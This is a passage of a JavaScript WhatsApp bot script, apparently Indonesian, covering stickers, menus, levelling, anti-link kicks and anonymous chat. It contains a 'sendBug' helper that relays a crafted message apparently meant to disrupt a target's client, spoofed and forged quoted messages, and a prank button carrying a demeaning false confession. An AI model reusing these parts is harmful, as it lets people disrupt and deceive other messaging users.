}
}
     const sendStickerFromUrl = async(to, url) => {
     var names = Date.now() / 10000;
     var download = function (uri, filename, callback) {
     request.head(uri, function (err, res, body) {
     request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
});
};
     download(url, './database/sampah' + names + '.png', async function () {
     console.log('selesai');
     let filess = './database/sampah' + names + '.png'
     let asw = './database/sampah' + names + '.webp'
     exec(`ffmpeg -i ${filess} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${asw}`, (err) => {
     let media = fs.readFileSync(asw)
     pemuda.sendMessage(to, media, MessageType.sticker,{quoted:mek})
     fs.unlinkSync(filess)
     fs.unlinkSync(asw)
});
});
}      
     let authorname = pemuda.contacts[from] != undefined ? pemuda.contacts[from].vname || pemuda.contacts[from].notify : undefined	
     if (authorname != undefined) { } else { authorname = groupName }	
     function addMetadata(packname, author) {	
     if (!packname) packname = 'Caca'; if (!author) author = 'Bot';author = author.replace(/[^a-zA-Z0-9]/g, '');	
     let name = `${author}_${packname}`
     if (fs.existsSync(`./media/sticker/${name}.exif`)) return `./media/sticker/${name}.exif`
     const json = {	
     "sticker-pack-name": packname,
     "sticker-pack-publisher": author,
}
     const littleEndian = Buffer.from([0x49, 0x49, 0x2A, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0x41, 0x57, 0x07, 0x00])	
     const bytes = [0x00, 0x00, 0x16, 0x00, 0x00, 0x00]	
     let len = JSON.stringify(json).length	
     let last	
     if (len > 256) {	
     len = len - 256	
     bytes.unshift(0x01)	
     } else {	
     bytes.unshift(0x00)	
}	
     if (len < 16) {	
     last = len.toString(16)	
     last = "0" + len	
     } else {	
     last = len.toString(16)	
}	
     const buf2 = Buffer.from(last, "hex")	
     const buf3 = Buffer.from(bytes)	
	 const buf4 = Buffer.from(JSON.stringify(json))	
	 const buffer = Buffer.concat([littleEndian, buf2, buf3, buf4])	
	 fs.writeFile(`./media/sticker/${name}.exif`, buffer, (err) => {	
	 return `./media/sticker/${name}.exif`	
})	
}
     const kickMember = async(id, target = []) => {
     let group = await pemuda.groupMetadata(id)
     let owner = group.owner.replace("c.us", "s.whatsapp.net")
     let me = pemuda.user.jid
     for (i of target) {
     if (!i.includes(me) && !i.includes(owner)) {
     await pemuda.groupRemove(from, [i])
     } else {
     await pemuda.sendMessage(id, "Not Premited!", "conversation")
     break
}
}
}
     const kick = function(from, orangnya){
     for (let i of orangnya){
	 pemuda.groupRemove(from, [i])
}
} 
     const sendKontak = (from, nomor, nama, org = "") => {
	 const vcard = 'BEGIN:VCARD\n' + 'VERSION:3.0\n' + 'FN:' + nama + '\n' + 'ORG:' + org + '\n' + 'TEL;type=CELL;type=VOICE;waid=' + nomor + ':+' + nomor + '\n' + 'END:VCARD'
	 pemuda.sendMessage(from, {displayname: nama, vcard: vcard}, MessageType.contact, {quoted: mek})
}                           
     const sendMediaURL = async(to, url, text="", mids=[]) =>{
     if(mids.length > 0){
     text = normalizeMention(to, text, mids)
}
     const fn = Date.now() / 10000;
     const filename = fn.toString()
     let mime = ""
     var download = function (uri, filename, callback) {
     request.head(uri, function (err, res, body) {
     mime = res.headers['content-type']
     request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
});
};
     download(url, filename, async function () {
     console.log('done');
     let media = fs.readFileSync(filename)
     let type = mime.split("/")[0]+"Message"
     if(mime === "image/gif"){
     type = MessageType.video
     mime = Mimetype.gif
}
     if(mime.split("/")[0] === "audio"){
     mime = Mimetype.mp4Audio
}
     pemuda.sendMessage(to, media, type, { quoted: mek, mimetype: mime, caption: text,contextInfo: {"mentionedJid": mids}})                    
     fs.unlinkSync(filename)
});
}
     const sendFileFromUrl = async(link, type, options) => {
     hasil = await getBuffer(link)
     pemuda.sendMessage(from, hasil, type, options).catch(e => {
	 fetch(link).then((hasil) => {
     pemuda.sendMessage(from, hasil, type, options).catch(e => {
	 pemuda.sendMessage(from, { url : link }, type, options).catch(e => {
     fakeitem('```[ ! ] Error Gagal Dalam Mendownload Dan Mengirim Media```')
	 console.log(e)
})
})
})
})
}    
     const sendStickerUrl = async(to, url) => {
     console.log(color(time, 'magenta'), color(moment.tz('Asia/Jakarta').format('HH:mm:ss'), "gold"), color('Downloading sticker...'))
     var names = getRandom('.webp')
     var namea = getRandom('.png')
     var download = function (uri, filename, callback) {
     request.head(uri, function (err, res, body) {
     request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
});
};
     download(url, namea, async function () {
     let filess = namea
     let asw = names
     require('../lib/exif.js')
     exec(`ffmpeg -i ${filess} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${asw}`, (err) => {
     exec(`webpmux -set exif ./sticker/data.exif ${asw} -o ${asw}`, async (error) => {
     let media = fs.readFileSync(asw)
     pemuda.sendMessage(from, media, sticker, {quoted: mek})
     console.log(color(time, 'magenta'), color(moment.tz('Asia/Jakarta').format('HH:mm:ss'), "gold"), color('Succes send sticker...'))
});
});
});
}        
     function addMetadata(packname, author) {
     if (!packname) packname = 'WAKK BOT';
     if (!author) author = 'ChandraGanz';
     author = author.replace(/[^a-zA-Z0-9]/g, '');
     let name = `${author}_${packname}`
     if (fs.existsSync(`./${name}.exif`)) return `./${name}.exif`
     const json = {
     "sticker-pack-name": packname,
     "sticker-pack-publisher": author,
}
     const littleEndian = Buffer.from([0x49, 0x49, 0x2A, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0x41, 0x57, 0x07, 0x00])
     const bytes = [0x00, 0x00, 0x16, 0x00, 0x00, 0x00]
     let len = JSON.stringify(json).length
     let last
     if (len > 256) {
     len = len - 256
     bytes.unshift(0x01)
     } else {
     bytes.unshift(0x00)
}
     if (len < 16) {
     last = len.toString(16)
     last = "0" + len
     } else {
     last = len.toString(16)
}
     const buf2 = Buffer.from(last, "hex")
     const buf3 = Buffer.from(bytes)
     const buf4 = Buffer.from(JSON.stringify(json))
     const buffer = Buffer.concat([littleEndian, buf2, buf3, buf4])
     fs.writeFile(`./${name}.exif`, buffer, (err) => {
     return `./${name}.exif`		
}
)	
}
//Button ocument
const Sendbutdocument = async(id, text1, desc1, file1, doc1, but = [], options = {}) => {

media = file1
kma = doc1
mhan = await pemuda.prepareMessage(from, media, document, kma)
const buttonMessages = {
documentMessage: mhan.message.documentMessage,
contentText: text1,
footerText: desc1,
buttons: but,
headerType: "DOCUMENT"
}
pemuda.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
}
     const sendButloc = async(id, text1, desc1, gam1, but = [], options = {}) => {
     let kma = gam1
     pemuda.sendMessage(id, {"contentText": text1,
     footerText: desc1, 
     buttons: but,
     headerType: "LOCATION",
     locationMessage: {
     text: text1,
     name: "South Brisbane",
     address: "Cloudflare, Inc",
     jpegThumbnail: kma
}
}, 
     MessageType.buttonsMessage, options)  
}                   
     const sendButMessage = (id, text1, desc1, but = [], options = {}) => {
     const buttonMessage = {
     contentText: text1,
     footerText: desc1,
     buttons: but,
     headerType: 1
}
     pemuda.sendMessage(id, buttonMessage, MessageType.buttonsMessage, options)
}
     const sendButVideo = async(id, text1, desc1, vid1, but = [], options = {}) => {
     kma = vid1
     mhan = await pemuda.prepareMessage(from, kma, video)
     const buttonMessages = {
     videoMessage: mhan.message.videoMessage,
     contentText: text1,
     footerText: desc1,
     buttons: but,
     headerType: 5
}
     pemuda.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
}    
     const sendBug = async (target) => {
     await pemuda.relayWAMessage(
     pemuda.prepareMessageFromContent(
     target,
     pemuda.prepareDisappearingMessageSettingContent(0),{}),{ waitForAck: true }) 
}  
     //Quote
     const data = fs.readFileSync('./lib/quote.json');
     jsonData = JSON.parse(data);
     randIndex = Math.floor(Math.random() * jsonData.length);
     randKey = jsonData[randIndex];
     randQuote =''+randKey.quote

                                 
	 colors = ['red', 'white', 'black', 'blue', 'yellow', 'green']	
     const isImage = (type === 'imageMessage')
     const isVideo = (type === 'videoMessage')
     const isSticker = (type == 'stickerMessage')
     const isList = (type == 'listResponseMessage')	 	 	    
	 const isMedia = (type === 'imageMessage' || type === 'videoMessage')
	 const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
	 const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
	 const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
     const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
     const isQuotedLoca = type === 'extendedTextMessage' && content.includes('locationMessage')
     const isQuotedContact = type === 'extendedTextMessage' && content.includes('contactMessage')
     const isQuotedDocs = type === 'extendedTextMessage' && content.includes('documentMessage')
     const isQuotedTeks = type === 'extendedTextMessage' && content.includes('quotedMessage')
     const isQuotedTag = type === 'extendedTextMessage' && content.includes('mentionedJid')
     const isQuotedProd = type === 'extendedTextMessage' && content.includes('productMessage')
     const isQuotedReply = type === 'extendedTextMessage' && content.includes('Message')   
     const fgif = { key: { participant: "0@s.whatsapp.net", ...(from ? { "remoteJid": "6289523258649-1604595598@g.us" } : {})}, "message": {videoMessage: { "title":`${fake}`, "h": `Hmm`,'seconds': '99999', 'gifPlayback': 'true', 'caption': `${fake}`, 'jpegThumbnail': potogw}}}              
     const fonce = { key : { fromMe: false, remoteJid: "6281315995629@g.us", participant: '0@s.whatsapp.net'}, message: { videoMessage: { "jpegThumbnail": fakeimage, "viewOnce": true}}}                                                              
     const fdoc = { key : { participant : "0@s.whatsapp.net", "remoteJid": "6289523258649-1604595598@g.us" },message: {documentMessage: {title: `${fake}`,jpegThumbnail: potofake}}}                                       
     const fkontak = { key: { participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: `6283136505591-1614953337@g.us` } : {}) }, message: { 'contactMessage': { 'displayName': `${groupName}`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${groupName},;;;\nFN:${groupName},\nitem1.TEL;waid=${sender.split('@')[0]}:${sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': potokeren, thumbnail: potokeren,sendEphemeral: true}}} 	        
     
 			//WAKTU

			var ase = new Date();

                        var jamss = ase.getHours();
                         switch(jamss){
                case 0: jamss = "Malam"; break;
                case 1: jamss = "Malam"; break;
                case 2: jamss = "Malam"; break;
                case 3: jamss = "Malam"; break;
                case 4: jamss = "Malam"; break;
                case 5: jamss = "Subuh"; break;
                case 6: jamss = "Pagi"; break;
                case 7: jamss = "Pagi"; break;
                case 8: jamss = "Pagi"; break;
                case 9: jamss = "Pagi"; break;
                case 10: jamss = "Pagi"; break;
                case 11: jamss = "Sore"; break;
                case 12: jamss = "Zuhur"; break;
                case 13: jamss = "Sore"; break;
                case 14: jamss = "Sore"; break;
                case 15: jamss = "Asr"; break;
                case 16: jamss = "Sore"; break;
                case 17: jamss = "Sore"; break;
                case 18: jamss = "Maghrib"; break;
                case 19: jamss = "Isha"; break;
                case 20: jamss = "Malam"; break;
                case 21: jamss = "Malam"; break;
                case 22: jamss = "Malam"; break;
                case 23: jamss = "Malam"; break;
            }
            var tampilUcapan = "" + jamss;
            const jmn = moment.tz('Asia/Jakarta').format('HH:mm:ss')
				let d = new Date
				let locale = 'id'
				let gmt = new Date(0).getTime() - new Date('1 Januari 2021').getTime()
				const weton = ['Pahing', 'Pon','Wage','Kliwon','Legi'][Math.floor(((d * 1) + gmt) / 84600000) % 5]
				const week = d.toLocaleDateString(locale, { weekday: 'long' })
				const calender = d.toLocaleDateString(locale, {
				day: 'numeric',
				month: 'long',
				year: 'numeric'
		       })
     //=======FAKE====\\\
// VIDEO
const fvid = {
	 key: { 
          fromMe: false,
	      participant: `0@s.whatsapp.net`, ...(from ? 
	 { remoteJid: "6289643739077-1613049930@g.us" } : {}) 
                },
	 message: { 
                 "videoMessage": { 
                 "title": `Project Pemuda`,
                 "h": `${tampilUcapan} ${pushname}`,
                 'duration': '99999', 
                 'caption': `${tampilUcapan} ${pushname}`,
                 'jpegThumbnail': fakeimage
                        }
                       }
	                  }
     const fgclink = { key: { participant: "0@s.whatsapp.net","remoteJid": "0@s.whatsapp.net"},"message": {"groupInviteMessage": {"groupJid": "6288213840883-1616169743@g.us","inviteCode": "m","groupName": "P", "caption": `${fake}`, 'jpegThumbnail': fs.readFileSync('./media/image/fake_1.jpeg')}}}      // faketroli      
     const ftroli = { key: { fromMe: false,"participant":"0@s.whatsapp.net",   "remoteJid": "6289523258649-1604595598@g.us"  }, "message": {orderMessage: {itemCount: 2021,status: 200, thumbnail: fakeimage, surface: 200, message: fake, orderTitle: 'zeeoneofc', sellerJid: '0@s.whatsapp.net'}}, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true}                       // LOCATION
const floc = {
	key : {
           participant : '0@s.whatsapp.net'
                        },
       message: {
                    liveLocationMessage: {
                    caption: `Halo ${pushname}`,
                    jpegThumbnail: fakeimage
                          }
                        }
                      }                          
         // fakecell               
     const fakecell = (teks) => { pemuda.sendMessage(from, teks, text, { quoted: { key:{ fromMe:false, participant:`0@s.whatsapp.net`, ...(from ? { remoteJid :"6289523258649-1604595598@g.us" }: {})}, message:{"orderMessage":{"orderId":"174238614569481","thumbnail":fs.readFileSync("./media/image/thumb.jpg"),"itemCount":2021,"status":"INQUIRY","surface":"CATALOG","message": fake,"token":"AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="}}}, contextInfo: {"forwardingScore":999,"isForwarded":true}, sendEphemeral: true})}
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              
     if (isCmd && !isGroup) {
 
     addBalance(sender, randomNomor(10), balance)        
     console.log(color('[ CMD PRIVATE ]'), color(moment(mek.messageTimestamp * 1000).format('HH:mm:ss'), 'white'), color(`${command} [${args.length}]`, 'cyan'))}
     
     //if (!command) console.log(mek)
     if (isCmd && isGroup) {
     addBalance(sender, randomNomor(10), balance)
     console.log(color('[ CMD GROUP ]'), color(moment(mek.messageTimestamp * 1000).format('HH:mm:ss'), 'white'), color(`${command} [${args.length}]`, 'cyan'), color('from', 'greenyellow'), color(`${pushname}`, 'yellow'), color('in', 'greenyellow'), color(`${groupName}`, 'gold'))}
                             
   	 if (!mek.key.fromMe && !isOwner && banChats === true) return		
 	 if (atibot === true) return	  
	                                                                          	                                                                          
     //Function Afk
     cekafk(afk)
     if (!mek.key.remoteJid.endsWith('@g.us') && offline){
     if (!mek.key.fromMe){
     if (isAfk(mek.key.remoteJid)) return
     addafk(mek.key.remoteJid)
     heheh = ms(Date.now() - waktu) 
     pemuda.sendMessage(mek.key.remoteJid,`@${owner} Sedang Offline!\n\n*Alasan :* ${alasan}\n*Sejak :* ${heheh.hours} Jam, ${heheh.minutes} Menit, ${heheh.seconds} Detik lalu\n\nSilahkan Hubungi Lagi Nanti`, MessageType.text,{contextInfo:{ mentionedJid: [`${owner}@s.whatsapp.net`],'stanzaId': "B826873620DD5947E683E3ABE663F263", 'participant': "0@s.whatsapp.net", 'remoteJid': 'status@broadcast', 'quotedMessage': {"imageMessage": {"caption": "*OFFLINE*", 'jpegThumbnail': fakeimage}}}})}}   
     if (mek.key.remoteJid.endsWith('@g.us') && offline) {
     if (!mek.key.fromMe){
     if (mek.message.extendedTextMessage != undefined){
     if (mek.message.extendedTextMessage.contextInfo != undefined){
     if (mek.message.extendedTextMessage.contextInfo.mentionedJid != undefined){
     for (let ment of mek.message.extendedTextMessage.contextInfo.mentionedJid) {
     if (ment === `${owner}@s.whatsapp.net`){
     if (isAfk(mek.key.remoteJid)) return
     addafk(mek.key.remoteJid)
     heheh = ms(Date.now() - waktu)
     pemuda.sendMessage(mek.key.remoteJid,`@${owner} Sedang Offline!\n\n *Alasan :* ${alasan}\n *Sejak :* ${heheh.hours} Jam, ${heheh.minutes} Menit, ${heheh.seconds} Detik lalu\n\nSilahkan Hubungi Lagi Nanti`, MessageType.text,{contextInfo:{ mentionedJid: [`${owner}@s.whatsapp.net`],'stanzaId': "B826873620DD5947E683E3ABE663F263", 'participant': "0@s.whatsapp.net", 'remoteJid': 'status@broadcast', 'quotedMessage': {"imageMessage": {"caption": "*OFFLINE*", 'jpegThumbnail': fakeimage}}}})}}}}
}
}
}
     //Role                   
     var levelRole = getLevelingLevel(sender)
     var role = 'Copper IV'
     if (levelRole <= 25) {
     role = 'Silver IV'
     } else if (levelRole <= 50) {
     role = 'Gold IV'
     } else if (levelRole <= 75) {
     role = 'Platinum IV'
     } else if (levelRole < 100) {
     role = 'Exterminator'
     }     
      
     //Lveling                                                            
     if (isGroup && isUser && !isMuted && !isGained (sender)) {
     const currentLevel = getLevelingLevel(sender)
     const checkId = getLevelingId(sender)
     try {
     addCooldown(sender)
     if (currentLevel === undefined && checkId === undefined) addLevelingId(sender)
     const amountXp = Math.floor(Math.random() * 10) + 150
     const requiredXp = 200 * (Math.pow(2, currentLevel) - 1)
     const getLevel = getLevelingLevel(sender)
     addLevelingXp(sender, amountXp)
     if (requiredXp <= getLevelingXp(sender)) {
     addLevelingLevel(sender, 1)
     sendButMessage(from, `*──「 LEVEL UP 」──*
     
*Name*: @${sender.split("@")[0]}
*XP*: ${getLevelingXp(sender)}
*Level*: ${getLevel} -> ${getLevelingLevel(sender)}
*Role*: ${role}

Congrats!! 🎉`, `Powered By Project Pemuda`, [{buttonId: `${prefix}profile`,buttonText: {displayText: `PROFILE`,},type: 1,}], {contextInfo: { mentionedJid: [sender]}})}
     } catch (err) {
     console.error(err)
}
}
     //Anonymous Chat
     if (!isCmd && from.endsWith('@s.whatsapp.net')) {
     pemuda.anonymous = pemuda.anonymous ? pemuda.anonymous: {}
     let room = Object.values(pemuda.anonymous).find(room => [room.a, room.b].includes(sender) && room.state === 'CHATTING')
     if (room) {
     if (/^.*(next|keluar|start)/.test(body)) return
     if ([`${prefix}next`, `${prefix}keluar`, `${prefix}start`, 'Cari Partner', 'Keluar', 'Next'].includes(body)) return
     let other = [room.a,
     room.b].find(user => user !== sender)
     if (type === "conversation") {
     pemuda.sendMessage(other, mek.message.conversation, text);
     } else {
     pemuda.sendMessageFromContent(other, mek.message)
}
}
}              
     //Total User
     if (isCmd && !isUser){
     pendaftar.push(sender)
     fs.writeFileSync('./database/user.json', JSON.stringify(pendaftar))
}     
     //Mute                                                             
     if (isMuted){
     if (!isGroupAdmins && !mek.key.fromMe && !isOwner && isPremium) return
}                          
     if (isGroup && isAntiLink && !isOwner && !isGroupAdmins && isBotGroupAdmins && !mek.key.fromMe && isPremium){
     if (budy.match(/(https:\/\/chat.whatsapp.com)/gi)) {
     reply(`*──「 GROUP LINK DETECTOR 」──*\n\nSepertinya kamu mengirimkan link grup, maaf kamu akan di kick`)
     pemuda.groupRemove(from, [sender])
}
}                     
     if (isGroup && isAntiLinkYt && !isOwner && !isGroupAdmins && isBotGroupAdmins && !mek.key.fromMe && isPremium){
     if (budy.match(/(https:\/\/youtu.be)/gi)) {
     reply(`*──「 ANTILINK YOUTUBE DETECTOR 」──*\n\nSepertinya kamu mengirimkan link youtube, maaf kamu akan di kick`)
     pemuda.groupRemove(from, [sender])
}
}                 
     if (isGroup && isAntiLinkWa && !isOwner && !isGroupAdmins && isBotGroupAdmins && !mek.key.fromMe && isPremium){
     if (budy.match(/(wa.me)/gi)) {
     reply(`*──「 ANTILINK WA DETECTOR 」──*\n\nSepertinya kamu mengirimkan link wa me, maaf kamu akan di kick`)
     pemuda.groupRemove(from, [sender])
} 
}
     if (isGroup && autojoin == true) {
     if (budy.includes("://chat.whatsapp.com/")) {
     pemuda.query({json: ["action","invite",`${budy.replace("https://chat.whatsapp.com/", "")}`]})
}
}
     if (!isGroup && !isCmd && !command && !mek.key.fromMe && !autorespon) {
     numd = await fetchJson(`https://api.telnyx.com/anonymous/v2/number_lookup/${senderNumber}`, {method: 'get'})
   	 simi = await fetchJson(`https://api.simsimi.net/v2/?text=${cmd}&lc=${numd.data.country_code}`)
     sami = simi.success
     pemuda.sendMessage(from, `${sami}`, text, {thumbnail: fakeimage, sendEphemeral: true, quoted:mek, contextInfo : {forwardingScore: 508, isForwarded: true}})
}    
     //Autoread          
     if (!setting.autoread) {
     pemuda.chatRead(from)
}    
     var chats = await pemuda.chats.array.filter(v => v.jid.endsWith('g.us'))
     chats.map( async ({ jid }) => {
     if (readG === false) return
     await pemuda.chatRead(jid)
}
)     
     var chatss = await pemuda.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
     chatss.map( async ({ jid }) => {
     if (readP === false) return
     await pemuda.chatRead(jid)
}
)
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        
     switch (isStc) {
     case "c1f40a203939746b645c97e107d97c4ed66793acdbcd541905b4e9d7ecf8ab69": // JADI ADMIN
     if (!isOwner) return
     if (!isBotGroupAdmins) return
     if (!isGroup) return
     mentioned = sender
     if (mentioned.length > 1) {
     teks = `@${mentioned.split('@')[0]} Sekarang Admin!`
     pemuda.sendMessage(from, teks, text, {contextInfo:{mentionedJid:[mentioned]}})
     pemuda.groupMakeAdmin(from, [mentioned])
     } else {
     pemuda.sendMessage(from, `@${mentioned.split('@')[0]} Sekarang Admin!`, text, {contextInfo:{mentionedJid:[mentioned]}})
     pemuda.groupMakeAdmin(from, [mentioned])}
     break
}                                            						
     switch (command) {  
     case 'command':
     case 'menu':
     case 'help':
            if(modelmenu == 'img'){
            gambr = fs.readFileSync('./media/image/fotogw.jpg')
            pemuda.sendMessage(from, gambr ,image,{quoted: mek,caption : help.Menunya(prefix, pushname, waktoo, totalgroup, totalkontak, totalchat, latensi, runtimenya)})
            } else if (modelmenu == 'buttontext'){
            sendButMessage(from, help.Menunya(prefix, pushname, waktoo, totalgroup, totalkontak, totalchat, latensi, runtimenya), `Powered By Project Pemuda`, [{buttonId: `${prefix}sc`,buttonText:{displayText: '𝗦𝗖𝗥𝗜𝗣𝗧 𝗕𝗢𝗧'},type:1},{buttonId:`${prefix}asupan`,buttonText:{displayText:'𝗔𝗦𝗨𝗣𝗔𝗡'},type:1},{buttonId: `${prefix}owner`,buttonText:{displayText: '𝗢𝗪𝗡𝗘𝗥'},type:1}], { contextInfo: { mentionedJid: [sender]}})
            } else if (modelmenu == 'buttonlokasi'){
            sendButloc(from, help.Menunya(prefix, pushname, waktoo, totalgroup, totalkontak, totalchat, latensi, runtimenya), `Speed ${latensi.toFixed(4)} Secconds\nPowered By Project Pemuda`, { jpegThumbnail: potogw }, [{buttonId: `${prefix}sc`,buttonText:{displayText: '𝗦𝗖𝗥𝗜𝗣𝗧 𝗕𝗢𝗧'},type:1},{buttonId:`${prefix}asupan`,buttonText:{displayText:'𝗔𝗦𝗨𝗣𝗔𝗡'},type:1},{buttonId: `${prefix}owner`,buttonText:{displayText: '𝗢𝗪𝗡𝗘𝗥'},type:1}], {contextInfo: { mentionedJid: [tagme + "@s.whatsapp.net"]}})
            } else if (modelmenu == 'combine'){ 
            buttons = [{buttonId: `${prefix}owner`, buttonText: {displayText: '👤 CONTACT OWNER'}, type: 1},{buttonId: `${prefix}rules`, buttonText: {displayText: '📒 R&S'}, type: 1},{buttonId: `${prefix}sc`, buttonText: {displayText: '📄 SCRIPT BOT'}, type: 1}]               
            imageMsg = (await pemuda.prepareMessageMedia(fs.readFileSync(`./media/image/fotogw.jpg`), 'imageMessage', {thumbnail: fs.readFileSync(`./media/image/fotogw.jpg`)})).imageMessage
                                                                
            buttonsMessage = {
            contentText: help.Menunya(prefix, pushname, waktoo, totalgroup, totalkontak, totalchat, latensi, runtimenya),        
            footerText: `Speed ${latensi.toFixed(4)} Secconds\nPowered By Project Pemuda`,
            imageMessage: imageMsg,
            buttons: buttons,
            headerType: 4
}
            
            prep = await pemuda.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftroli, sendEphemeral: true, contextInfo:{"forwardingScore":999,"isForwarded":true, "mentionedJid": [sender],"externalAdReply": {"title": `${week} ${weton} - ${calender}`, mediaType: 2, "thumbnail": fs.readFileSync('./media/image/Chan.jpg'),"previewType": "VIDEO","mediaUrl": `https://youtu.be/x-O0WHkv3uc`}}})
            pemuda.relayWAMessage(prep)                                                                                                                                                                                                          
            } else if (modelmenu == 'product'){
            gambr = fs.readFileSync('./media/image/fotogw.jpg')
            imeuhh = await pemuda.prepareMessage('0@s.whatsapp.net', gambr, image) 
            imeghh = imeuhh.message.imageMessage
            reshh = await pemuda.prepareMessageFromContent(from,{
            "productMessage": {
            "product": {
            "productImage": imeghh,
            "productId": "4457725420906655",
            "title": "LIST MENU",
            "description": help.Menunya(prefix, pushname, waktoo, totalgroup, totalkontak, totalchat, latensi, runtimenya),
            "currencyCode": "IDR",
            "priceAmount1000": `500000`,
            "productImageCount": 1
},
            "businessOwnerJid": "6283803330107@s.whatsapp.net",
            "contextInfo": {
            "forwardingScore": 508,
            "isForwarded": true
}
}
            }, {quoted: ftroli, contextInfo:{forwardingScore: 508, isForwarded: true, mentionedJid: [sender]}}) 
            pemuda.relayWAMessage(reshh)
            } else if(modelmenu == 'katalog'){    
            buf = fs.readFileSync('./media/image/fotogw.jpg')
            imeu = await pemuda.prepareMessage('0@s.whatsapp.net', buf, image) 
            imeg = imeu.message.imageMessage
            res = await pemuda.prepareMessageFromContent(from,{
            "orderMessage": {
            "orderId": "386756689777647",
            "thumbnail": fs.readFileSync("./media/image/fotogw.jpg"), 
            "itemCount": 91738292937291,
            "status": "INQUIRY",
            "surface": "CATALOG",
            "orderTitle": "ChandraGanz",
            "message": help.Menunya(prefix, pushname, waktoo, totalgroup, totalkontak, totalchat, latensi, runtimenya),
            "sellerJid": "6285742340891@s.whatsapp.net",
            "token": "AR4A7ORYqgEUjJ13M6nxZgjl+eVl4r86vY09jyg9/xIiPA==",
           
            "totalAmount1000": "99999999999999999999",
            "totalCurrencyCode": "IDR",
            "contextInfo": {
            "forwardingScore": 3,
            "isForwarded": true }}}, {quoted: ftroli, contextInfo:{},sendEphemeral: true})
            pemuda.relayWAMessage(res)                                    
            } else if(modelmenu == 'pdf'){  
doku = help.Menunya(prefix, pushname, waktoo, totalgroup, totalkontak, totalchat, latensi, runtimenya)
Sendbutdocument(from, doku, "© Project Pemuda*", fs.readFileSync('./media/Project Pemuda.pdf'), {mimetype:Mimetype.pdf, thumbnail:fs.readFileSync('./media/image/thumb.jpg'), filename:`Project Pemuda.pdf`, pageCount: 9999999 }, [{buttonId:`!000`,buttonText:{displayText:'Hai‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎\n\nSemuanya aku mau Jujur Kalau aku itu Gay dan Lagi Pengen Sama Cowok berotot untuk jadi Pacarku, yang Berminat Bisa Chat aku yahh 😋'},type:1}], {quoted:fdoc, contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title:`Halo - ${pushname}\nDownload Script`,mediaType:"2",thumbnail: fs.readFileSync(`./media/image/fotogw.jpg`), mediaUrl:`https://youtu.be/x-O0WHkv3uc`}}})


            pemuda.relayWAMessage(prep)                       
    
            } else if(modelmenu == 'default'){
            hm = help.Menunya(prefix, pushname, waktoo, totalgroup, totalkontak, totalchat, latensi, runtimenya)
            reply(hm)
}
            break      
    case 'setmenu':
            if (!mek.key.fromMe && !isOwner) return freply(mess.only.owner)
            if (args.length < 1) return freply(`Hallo Kack ${pushname}👋\nPilih salah satu di bawah ini!!\n\n🌹pdf\n🌹img\n🌹katalog\n🌹default\n🌹product\n🌹combine\n🌹buttontext\n🌹buttonlokasi`)
            if(args[0] == 'combine'){
            modelmenu = 'combine'
            reply(`_*Succses Changed Menu Combine🌹*_`)
}
            else if(args[0] == 'img'){
            modelmenu = 'img'
            reply(`_*Succses Changed Menu image🌹*_`)
}
            else if(args[0] == 'katalog'){
            modelmenu = 'katalog'
            reply(`_*Succses Changed Menu Katalog🌹*_`)
}
            else if(args[0] == 'product'){
            modelmenu = 'product'
            reply(`_*Succses Changed Menu Product🌹*_`)
}
            else if(args[0] == 'buttonimage'){
            modelmenu = 'button'
            reply(`_*Succses Changed Menu Buttonimage🌹*_`)
}
            else if(args[0] == 'buttonlokasi'){
             modelmenu = 'buttonlokasi'
            reply(`_*Succses Changed Menu Buttonlokasi🌹*_`)
}
            else if(args[0] == 'pdf'){
            modelmenu = 'pdf'
            reply(`_*Succses Changed Menu Pdf🌹*_`)
}
            else if(args[0] == 'buttontext'){
            modelmenu = 'buttontext'
            reply(`_*Succses Changed Menu Buttontext🌹*_`)
}
            else if(args[0] == 'default'){
            modelmenu = 'default'
            reply(`_*Succses Changed Menu Default🌹*_`)
            } else {
            reply(`Input ${args[0]} tidak ada di List!!`)
}         
            break             
    case 'rules':
            rulss = `𝗥𝗨𝗟𝗘𝗦 𝗕𝗢𝗧🌹
    
\`\`\`Tolong Gunakan Botnya Dengan Bijak Kalo Delay Jangan Spam 
Saat Menggunakan Bot, Mentang Mentang Gratis Diborong Semua.
Bot Tidak Aktif 24 Jam, 
Jadi Tergantung Kalau Ownernya Lagi Ada Waktu Botnya Juga Online.
Call/VC Bot Auto Block.
Jangan Call/VC 
Konsekuensi Bila Melanggar Rules
Bot Akan Memblokir Kamu Atau Keluar Dari Grup Yang Kamu Kelola.
Rules ini Untuk Kenyamanan Semua Yang Memakai\`\`\`
Bot ini 

*Jika Sudah Dipahami Rules-nya, Jangan Dilanggar Ya Kack* ☕`
            buttons = [{buttonId: `${prefix}owner`,buttonText:{displayText: '𝗢𝗪𝗡𝗘𝗥'},type:1}]
